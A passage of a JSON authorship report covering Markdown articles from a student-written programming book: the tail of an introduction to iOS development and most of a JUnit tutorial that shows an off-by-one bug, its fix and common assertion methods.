        "lineNumber": 20,
        "author": {
          "gitId": "-"
        },
        "content": "## What is iOS?"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "-"
        },
        "content": "iOS is the mobile operating system that runs on Apple\u0027s mobile devices, most notably the iPhone and the iPad. Applications that run on iOS can be downloaded officially from the App Store, and developers of iOS applications can submit their own applications to the App Store to share it with the rest of the world. "
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "-"
        },
        "content": "## Why iOS?"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "-"
        },
        "content": "[2 operating systems dominate the whole market share: iOS and Android](https://www.theverge.com/2017/2/16/14634656/android-ios-market-share-blackberry-2016). While more devices are running Android compared to iOS, given below are some areas in which iOS outshines Android:"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Better Compatibility and Standardisation"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "-"
        },
        "content": "iOS applications are specific to the Apple devices of the iPhone and iPad line, whereas Android runs across numerous different types of devices, including phones, tablets, watches, and more. The large variation of devices poses a compatibility problem from a developer\u0027s standpoint, because now applications have to be tested and working across all these different devices, and also regularly maintained this way. Each hardware device may possibly be running their own version of Android or will only support up to a particular version, thus Android developers will have to ensure that their application is also compatible across different versions of Android."
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": "With less devices to target, iOS developers have more control over their application and are able to customise the application to a greater extent, because there are less variations (in terms of device compatibility) to worry about. OS versioning in iOS is also more structured, with better backwards-compatability across their devices. Users of iOS devices (oldest supported is iPhone 5S, as of March 2019) are always immediately prompted whenever a new version of iOS is available for download. This means that as developers, we have to worry less about compatability issues, and focus more on the application itself."
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Lucrative Market"
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": "While Android has higher market share of devices, iOS applications generate [nearly double](https://techcrunch.com/2018/07/16/apples-app-store-revenue-nearly-double-that-of-google-play-in-first-half-of-2018/) the revenue compared to Android, largely due to the fact that users of iOS devices are generally more likely to spend on apps."
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "As an independent iOS developer, this means that your iOS application could bring in more revenue for you as compared to an Android one, assuming you choose to monetize it. "
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "More app revenue for iOS applications also means companies will look to tackle the iOS platform more so than Android, thus the demand for iOS developers will be high. This in turn results in [higher salary for iOS developers compared to their Android counterparts](https://www.fiercewireless.com/developer/ios-developers-earn-roughly-10k-more-than-android-counterparts-study-shows)."
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "#### Higher Quality Applications"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "The Apple App Store [subjects the apps to higher quality control](https://developer.apple.com/app-store/review/) (as compared to Android Play Store) before they are allowed to be published. This means that applications on the App Store are more robust, and of higher quality in general."
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Native iOS Applications vs. Cross-Platform Applications"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "jamessspanggg"
        },
        "content": "Mobile applications that run on the iOS platform can be written both natively and using [cross-platform solutions](https://www.businessofapps.com/guide/cross-platform-mobile-app-development/). Native iOS applications are written using [Objective-C or Swift](https://android.jlelse.eu/objective-c-or-swift-which-technology-to-learn-for-ios-app-development-3c681d1a05ac) on the Xcode IDE that you can download if you are running a MacOS. Cross-platform solutions are tools that allow you to write code once and develop applications for more than 1 platform. Some examples include [React Native](https://facebook.github.io/react-native/), [Xamarin](https://visualstudio.microsoft.com/xamarin/), and [Ionic](https://ionicframework.com/). Both methods have their own pros and cons, and these factors not only affect the app developers, but also the users to some extent."
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "The main attraction to developing mobile applications using cross-platform solutions is development time. Cross-platform solutions allow you to write code once, but push it out to more than one OS, usually iOS and Android being two of these platforms. This means that essentially, your development time is cut by half, because you are only writing code once for 2 separate applications. While this may sound like an attractive deal, there are a bunch of caveats to consider that can potentially be a deal breaker, [performance and compatability issues being the frontrunners](https://codeburst.io/native-vs-cross-platform-app-development-pros-and-cons-49f397bb38ac)."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "If you are coming from a web development background, you might want to consider starting with React Native. React Native as a cross-platform mobile development framework will give you a mobile development environment that is very similar to a web development one (especially if you are familiar with ReactJS), using the same JavaScript structure as ReactJS, and also uses `props`, `state`, and all the standard React component lifecycle methods. It will allow you to learn about mobile development while on familiar ground."
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "If you are a complete beginner to programming or do not have much software engineering experience, native iOS development with Swift might be a better choice to start with. Given that Swift is a statically typed language, more errors will be caught earlier, and you will be forced to be more structured and disciplined in your code. With Swift being a fast and readable language, it is not a bad language to start learning programming with or to pick up general software engineering skills with."
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "Tejas2805"
        },
        "content": "## Getting Started With Native iOS Development"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "To get started with native iOS development, we have to first get some of the basic tools set up:"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "- To use Xcode and write native iOS applications in Swift, you will need MacOS. If you are using a non-Mac operating system (Windows, Linux or others), you can install a MacOS Virtual Machine on your computer. This [blog post](https://medium.com/@twister.mr/installing-macos-to-virtualbox-1fcc5cf22801) is an excellent tutorial on how this can be done. If you already own a Macbook or an iMac, you are all set for this step."
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "- Next, you should register for a free Apple Developer Account. Don\u0027t confuse this with the paid iOS Developer Program! Anyone can register for the Apple Developer Account for free. Go to [Apple\u0027s Developer Website](https://developer.apple.com/register/) to do this. It requires you to have an Apple ID, so you can use your existing one if you already have an Apple ID."
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": "- Once you have an Apple Developer Account, you can either directly download Xcode from the [website](https://developer.apple.com/xcode/), or search for Xcode on your Mac App Store. Xcode is the Integrated Development Environment (IDE) that provides you with everything you need to develop an iOS app from scratch. It also comes with the iPhone and iPad simulator that you will need to test your application."
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": "![Xcode and Simulator](https://insights.dice.com/wp-content/uploads/2018/06/Xcode-Mac-iPad-Apple-Dice.png)"
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "([Image](https://insights.dice.com/wp-content/uploads/2018/06/Xcode-Mac-iPad-Apple-Dice.png) from [Dice Insights](https://insights.dice.com/))"
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "Native iOS applications can be written in [Objective-C or Swift](https://android.jlelse.eu/objective-c-or-swift-which-technology-to-learn-for-ios-app-development-3c681d1a05ac). Swift is a relatively newer language, introduced only in 2014, while Objective-C is more of an old school programming language. If you are just starting out on iOS development, you should strongly consider using Swift. The main reason being that many of the documentations and help on the internet are written for iOS development in Swift, hence it will be easier to look for resources that target Swift instead of Objective-C. Furthermore, Apple mostly regards Swift as the main language for iOS programming now, and Objective-C support is now more of a backward-compatability. "
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "If you are new to Swift, you may want to read up on our Swift article: [Introduction to Swift]({{baseUrl}}/contents/swift/welcome-to-swift.html)"
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": "If you are ready to begin developing your first iOS application, you will want to check out these iOS development tutorials and articles meant for first-timers:"
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": "- [Codewithchris: How to make an iPhone app](https://codewithchris.com/how-to-make-an-iphone-app/)"
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "- [raywenderlich.com \"How to build a simple iOS app\"](https://www.raywenderlich.com/3114-ios-tutorial-how-to-create-a-simple-iphone-app-part-1-3)"
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": "Some useful iOS development resources:"
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "- [Ray Wenderlich](https://www.raywenderlich.com/ios)"
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": "- [Brian Advent](https://www.youtube.com/channel/UCysEngjfeIYapEER9K8aikw)"
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "- [Let\u0027s Build That App](https://www.youtube.com/channel/UCuP2vJ6kRutQBfRmdcI92mA)"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/div\u003e"
      }
    ],
    "authorContributionMap": {
      "Tejas2805": 5,
      "jamessspanggg": 1,
      "-": 74
    }
  },
  {
    "path": "contents/java/JUnit.md",
    "fileType": "md",
    "lines": [
      {
        "lineNumber": 1,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cfrontmatter\u003e"
      },
      {
        "lineNumber": 2,
        "author": {
          "gitId": "-"
        },
        "content": "  title: \"JUnit\""
      },
      {
        "lineNumber": 3,
        "author": {
          "gitId": "-"
        },
        "content": "  header: pagetop.md"
      },
      {
        "lineNumber": 4,
        "author": {
          "gitId": "-"
        },
        "content": "  footer: footer.md"
      },
      {
        "lineNumber": 5,
        "author": {
          "gitId": "-"
        },
        "content": "  head: head.md"
      },
      {
        "lineNumber": 6,
        "author": {
          "gitId": "-"
        },
        "content": "  siteNav: mainNav.md"
      },
      {
        "lineNumber": 7,
        "author": {
          "gitId": "-"
        },
        "content": "  pageNav: 3"
      },
      {
        "lineNumber": 8,
        "author": {
          "gitId": "-"
        },
        "content": "\u003c/frontmatter\u003e"
      },
      {
        "lineNumber": 9,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 10,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cdiv class\u003d\"website-content\"\u003e"
      },
      {
        "lineNumber": 11,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 12,
        "author": {
          "gitId": "-"
        },
        "content": "{{ booktitle | safe }}"
      },
      {
        "lineNumber": 13,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 14,
        "author": {
          "gitId": "-"
        },
        "content": "# JUnit"
      },
      {
        "lineNumber": 15,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 16,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cb\u003eAuthor: [Lin Si Jie](https://github.com/sijie123)\u003c/b\u003e"
      },
      {
        "lineNumber": 17,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 18,
        "author": {
          "gitId": "-"
        },
        "content": "Reviewers: [Aadyaa Maddi](https://github.com/amad-person), [Marvin Chin](https://github.com/marvinchin)"
      },
      {
        "lineNumber": 19,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 20,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003cbox id\u003d\"article-toc\"\u003e"
      },
      {
        "lineNumber": 21,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 22,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [What is JUnit?‎](#what-is-junit)"
      },
      {
        "lineNumber": 23,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Why JUnit?‎](#why-junit)"
      },
      {
        "lineNumber": 24,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [JUnit Features‎](#junit-features)"
      },
      {
        "lineNumber": 25,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Assertions API‎](#assertions-api)"
      },
      {
        "lineNumber": 26,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Before/After Hooks‎](#before-after-hooks)"
      },
      {
        "lineNumber": 27,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "  * [Extension Model‎](#extension-model)"
      },
      {
        "lineNumber": 28,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "* [Getting Started‎](#getting-started)"
      },
      {
        "lineNumber": 29,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": "\u003c/box\u003e"
      },
      {
        "lineNumber": 30,
        "author": {
          "gitId": "iskandarzulkarnaien"
        },
        "content": ""
      },
      {
        "lineNumber": 31,
        "author": {
          "gitId": "-"
        },
        "content": "## What is JUnit?"
      },
      {
        "lineNumber": 32,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 33,
        "author": {
          "gitId": "-"
        },
        "content": "**JUnit is an _automated testing framework_ for Java** i.e., it can be used to programmatically verify the actual behavior of Java code against the expected behavior."
      },
      {
        "lineNumber": 34,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 35,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s use a simple example to see how JUnit is used. Suppose we want to test the method `calculateArraySum(int[] values, int n)` which returns the sum of the first `n` elements of `values`."
      },
      {
        "lineNumber": 36,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 37,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 38,
        "author": {
          "gitId": "-"
        },
        "content": "public class Utils {"
      },
      {
        "lineNumber": 39,
        "author": {
          "gitId": "-"
        },
        "content": "  // Sum up first n elements in values, and return the result"
      },
      {
        "lineNumber": 40,
        "author": {
          "gitId": "-"
        },
        "content": "  public static int calculateArraySum(int[] values, int n) {"
      },
      {
        "lineNumber": 41,
        "author": {
          "gitId": "-"
        },
        "content": "    int sum \u003d 0;"
      },
      {
        "lineNumber": 42,
        "author": {
          "gitId": "-"
        },
        "content": "    for (int i \u003d 1; i \u003c n; i++) {"
      },
      {
        "lineNumber": 43,
        "author": {
          "gitId": "-"
        },
        "content": "      sum +\u003d values[i];"
      },
      {
        "lineNumber": 44,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 45,
        "author": {
          "gitId": "-"
        },
        "content": "    return sum;"
      },
      {
        "lineNumber": 46,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 47,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 48,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 49,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 50,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s write a test to check the correctness of our code. This test will use a sample array of size 5 that sums to 15, and check that our `calculateArraySum` returns the correct result."
      },
      {
        "lineNumber": 51,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 52,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 53,
        "author": {
          "gitId": "-"
        },
        "content": "public class UtilsTest {"
      },
      {
        "lineNumber": 54,
        "author": {
          "gitId": "-"
        },
        "content": "  @Test"
      },
      {
        "lineNumber": 55,
        "author": {
          "gitId": "-"
        },
        "content": "  public void calculateArraySum_fiveNumbers_correctAnswer() {"
      },
      {
        "lineNumber": 56,
        "author": {
          "gitId": "-"
        },
        "content": "    int[] testArray \u003d {1, 2, 3, 4, 5};"
      },
      {
        "lineNumber": 57,
        "author": {
          "gitId": "-"
        },
        "content": "    assertEquals(15, calculateArraySum(testArray, 5));"
      },
      {
        "lineNumber": 58,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 59,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 60,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 61,
        "author": {
          "gitId": "-"
        },
        "content": "\u003ctip-box\u003e:bulb: By convention, we append `Test` to the name of the tested class. It is also good practice to write a descriptive name for the test, so other developers will know the intention and scope of each test.\u003c/tip-box\u003e"
      },
      {
        "lineNumber": 62,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 63,
        "author": {
          "gitId": "-"
        },
        "content": "That\u0027s it! We are ready to run the tests through our IDE. The `@Test` tag tells JUnit that the `calculateArraySum_fiveNumbers_correctAnswer` method is meant to be a test. JUnit will then automatically execute our test(s)."
      },
      {
        "lineNumber": 64,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 65,
        "author": {
          "gitId": "-"
        },
        "content": "Let\u0027s have a look at the test results. "
      },
      {
        "lineNumber": 66,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 67,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"{{baseUrl}}/contents/java/assertFailed.PNG\" /\u003e"
      },
      {
        "lineNumber": 68,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 69,
        "author": {
          "gitId": "-"
        },
        "content": "Hmm, the test seems to fail when we run it."
      },
      {
        "lineNumber": 70,
        "author": {
          "gitId": "-"
        },
        "content": "Did you notice the subtle bug in `calculateArraySum`?"
      },
      {
        "lineNumber": 71,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 72,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 73,
        "author": {
          "gitId": "-"
        },
        "content": "We \"forgot\" to include the 0-th element of inputArray, a common off-by-one bug."
      },
      {
        "lineNumber": 74,
        "author": {
          "gitId": "-"
        },
        "content": "With JUnit, we can use automatic tests to ensure that our functions are correct. This is easier and less error-prone than repeatedly testing and calculating manually."
      },
      {
        "lineNumber": 75,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 76,
        "author": {
          "gitId": "-"
        },
        "content": "Now, let\u0027s fix the code."
      },
      {
        "lineNumber": 77,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 78,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 79,
        "author": {
          "gitId": "-"
        },
        "content": "public class Utils {"
      },
      {
        "lineNumber": 80,
        "author": {
          "gitId": "-"
        },
        "content": "  // Sum up first n elements in values, and return the result"
      },
      {
        "lineNumber": 81,
        "author": {
          "gitId": "-"
        },
        "content": "  public static int calculateArraySum(int[] values, int n) {"
      },
      {
        "lineNumber": 82,
        "author": {
          "gitId": "-"
        },
        "content": "    int sum \u003d 0;"
      },
      {
        "lineNumber": 83,
        "author": {
          "gitId": "-"
        },
        "content": "    for (int i \u003d 0; i \u003c n; i++) {"
      },
      {
        "lineNumber": 84,
        "author": {
          "gitId": "-"
        },
        "content": "      sum +\u003d values[i];"
      },
      {
        "lineNumber": 85,
        "author": {
          "gitId": "-"
        },
        "content": "    }"
      },
      {
        "lineNumber": 86,
        "author": {
          "gitId": "-"
        },
        "content": "    return sum;"
      },
      {
        "lineNumber": 87,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 88,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 89,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 90,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 91,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cimg src\u003d\"{{baseUrl}}/contents/java/assertPass.PNG\" /\u003e"
      },
      {
        "lineNumber": 92,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 93,
        "author": {
          "gitId": "-"
        },
        "content": "Running the same unit test again, we now have a passing test. Our `calculateArraySum` function works as intended. "
      },
      {
        "lineNumber": 94,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 95,
        "author": {
          "gitId": "-"
        },
        "content": "To assure ourselves that `calculateArraySum` works for more scenarios (what if `n` \u003d 0?), we can write more tests covering these cases."
      },
      {
        "lineNumber": 96,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 97,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 98,
        "author": {
          "gitId": "-"
        },
        "content": "public class UtilsTest {"
      },
      {
        "lineNumber": 99,
        "author": {
          "gitId": "-"
        },
        "content": "  @Test"
      },
      {
        "lineNumber": 100,
        "author": {
          "gitId": "-"
        },
        "content": "  public void calculateArraySum_fiveNumbers_correctAnswer() {"
      },
      {
        "lineNumber": 101,
        "author": {
          "gitId": "-"
        },
        "content": "    int[] testArray \u003d {1, 2, 3, 4, 5};"
      },
      {
        "lineNumber": 102,
        "author": {
          "gitId": "-"
        },
        "content": "    assertEquals(15, calculateArraySum(testArray, 5));"
      },
      {
        "lineNumber": 103,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 104,
        "author": {
          "gitId": "-"
        },
        "content": "  @Test"
      },
      {
        "lineNumber": 105,
        "author": {
          "gitId": "-"
        },
        "content": "  public void calculateArraySum_noNumbers_zero() {"
      },
      {
        "lineNumber": 106,
        "author": {
          "gitId": "-"
        },
        "content": "    int[] testArray \u003d {};"
      },
      {
        "lineNumber": 107,
        "author": {
          "gitId": "-"
        },
        "content": "    assertEquals(0, calculateArraySum(testArray, 0));"
      },
      {
        "lineNumber": 108,
        "author": {
          "gitId": "-"
        },
        "content": "  }"
      },
      {
        "lineNumber": 109,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 110,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 111,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 112,
        "author": {
          "gitId": "-"
        },
        "content": "Unit tests like these help to prevent against regression. If `calculateArraySum` is ever changed, these tests can quickly verify that its functionality remains correct."
      },
      {
        "lineNumber": 113,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 114,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cp\u003e\u003c/p\u003e "
      },
      {
        "lineNumber": 115,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 116,
        "author": {
          "gitId": "-"
        },
        "content": "## Why JUnit?"
      },
      {
        "lineNumber": 117,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 118,
        "author": {
          "gitId": "-"
        },
        "content": "Here are some key reasons why developers should consider using JUnit, as compared to other Java testing tools like TestNG:"
      },
      {
        "lineNumber": 119,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 120,
        "author": {
          "gitId": "-"
        },
        "content": "1. \u003cb\u003eJUnit is well-integrated with development tools.\u003c/b\u003e It is supported by many popular IDEs such as IntelliJ IDEA, Eclipse, NetBeans, Visual Studio Code and many more. \u003cb\u003eThis makes it convenient for developers to write and run tests.\u003c/b\u003e"
      },
      {
        "lineNumber": 121,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 122,
        "author": {
          "gitId": "-"
        },
        "content": "2. \u003cb\u003eJUnit is well-established.\u003c/b\u003e JUnit has a longer history and a larger community. It is also more popular among developers (according to [Synk\u0027s 2018 report](https://snyk.io/blog/jvm-ecosystem-report-2018-tools/)). \u003cb\u003eThis means that it is easier to find answers or get help with JUnit.\u003c/b\u003e"
      },
      {
        "lineNumber": 123,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 124,
        "author": {
          "gitId": "-"
        },
        "content": "\u003cp\u003e\u003c/p\u003e "
      },
      {
        "lineNumber": 125,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 126,
        "author": {
          "gitId": "-"
        },
        "content": "## JUnit Features"
      },
      {
        "lineNumber": 127,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 128,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to the basic example in the introduction, JUnit also has more powerful features that further simplifies the process of writing complex tests."
      },
      {
        "lineNumber": 129,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 130,
        "author": {
          "gitId": "-"
        },
        "content": "### Assertions API"
      },
      {
        "lineNumber": 131,
        "author": {
          "gitId": "-"
        },
        "content": "In addition to the `assertEquals` method illustrated in the introduction, JUnit allows us to check for many other things. These include:"
      },
      {
        "lineNumber": 132,
        "author": {
          "gitId": "-"
        },
        "content": "* `assertTrue`/`assertFalse`: checks whether statements return true/false as expected."
      },
      {
        "lineNumber": 133,
        "author": {
          "gitId": "-"
        },
        "content": "* `assertNull`/`assertNotNull`: checks whether something is null or not, without causing a NullPointerException."
      },
      {
        "lineNumber": 134,
        "author": {
          "gitId": "-"
        },
        "content": "* `assertArrayEquals`: yes, it loops through an entire array for us!"
      },
      {
        "lineNumber": 135,
        "author": {
          "gitId": "-"
        },
        "content": "* `assertThrows`/`assertDoesNotThrow`: verify the actual error handling behavior against the expected error handling behavior."
      },
      {
        "lineNumber": 136,
        "author": {
          "gitId": "-"
        },
        "content": "* `assertTimeout`: ensures that a piece of code runs within time constraints - we don\u0027t want to keep the user waiting!"
      },
      {
        "lineNumber": 137,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 138,
        "author": {
          "gitId": "-"
        },
        "content": "These powerful expressions means that we can write more expressive tests."
      },
      {
        "lineNumber": 139,
        "author": {
          "gitId": "-"
        },
        "content": "Without JUnit, developers can test by writing:"
      },
      {
        "lineNumber": 140,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 141,
        "author": {
          "gitId": "-"
        },
        "content": "try {"
      },
      {
        "lineNumber": 142,
        "author": {
          "gitId": "-"
        },
        "content": "  int result \u003d divide(100, 0); // Divides 100 by 0"
      },
      {
        "lineNumber": 143,
        "author": {
          "gitId": "-"
        },
        "content": "} catch (ArithmeticException ae) {"
      },
      {
        "lineNumber": 144,
        "author": {
          "gitId": "-"
        },
        "content": "  // This is the expected behaviour."
      },
      {
        "lineNumber": 145,
        "author": {
          "gitId": "-"
        },
        "content": "  return;"
      },
      {
        "lineNumber": 146,
        "author": {
          "gitId": "-"
        },
        "content": "}"
      },
      {
        "lineNumber": 147,
        "author": {
          "gitId": "-"
        },
        "content": "// If code is here, then the ArithmeticException wasn\u0027t thrown."
      },
      {
        "lineNumber": 148,
        "author": {
          "gitId": "-"
        },
        "content": "throw new AssertionError(\"Dividing 100 by 0 should throw an exception!\");"
      },
      {
        "lineNumber": 149,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
        "lineNumber": 150,
        "author": {
          "gitId": "-"
        },
        "content": ""
      },
      {
        "lineNumber": 151,
        "author": {
          "gitId": "-"
        },
        "content": "With JUnit, we can replace the above code with just this line:"
      },
      {
        "lineNumber": 152,
        "author": {
          "gitId": "-"
        },
        "content": "```java"
      },
      {
        "lineNumber": 153,
        "author": {
          "gitId": "-"
        },
        "content": "assertThrows(ArithmeticException.class, () -\u003e divide(100, 0));"
      },
      {
        "lineNumber": 154,
        "author": {
          "gitId": "-"
        },
        "content": "```"
      },
      {
